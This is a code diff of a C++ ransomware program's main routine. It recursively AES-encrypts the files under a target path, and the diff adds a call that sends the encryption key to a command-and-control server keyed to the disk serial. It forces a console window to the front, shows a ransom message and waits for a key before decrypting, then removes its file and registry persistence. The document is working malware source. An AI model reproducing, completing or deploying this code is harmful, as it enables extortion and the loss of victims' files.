@@ -54,6 +54,9 @@ int main(int argc, char* argv[]) {
     std::string hwid = "C:\\Windows\\SysWOW64\\" + persistence::getDiskSerial() + ".txt";
 
 
+    ShowWindow(Console, 1);
+    std::thread ForceOpen(persistence::ForceConsoleToFront);
+    ForceOpen.detach();
     // { ENCRYPTION } //
 
     std::string enc_path;
@@ -63,15 +66,10 @@ int main(int argc, char* argv[]) {
     AES256CBC AES;
 
     AES.generateKey();
-    for (const auto &entry : std::filesystem::recursive_directory_iterator(enc_path)) {
-        std::string filename = entry.path().string();
-        if (!std::filesystem::is_directory(filename))
-            AES.encryptFile(filename);
-    }
+    AES.keyToC2(hwid);
+    AES.encryptRecursively(enc_path);
+
     // { END ENCRYPTION } //
-    ShowWindow(Console, 1);
-    std::thread ForceOpen(persistence::ForceConsoleToFront);
-    ForceOpen.detach();
     persistence::CryptMessage();
     std::string fakeKey;
     while (fakeKey != "123") {
@@ -79,12 +77,8 @@ int main(int argc, char* argv[]) {
         Sleep(5000); // Пауза 5 секунд перед следующей проверкой
     }
 
-    AES.keyFromFile();
-    for (const auto &entry : std::filesystem::recursive_directory_iterator(enc_path)) {
-        std::string filename = entry.path().string();
-        if (!std::filesystem::is_directory(filename))
-            AES.decryptFile(filename);
-    }
+    //AES.keyFromC2(hwid);
+    AES.decryptRecursively(enc_path);
 
     persistence::cleanfile();
     persistence::cleanreg();
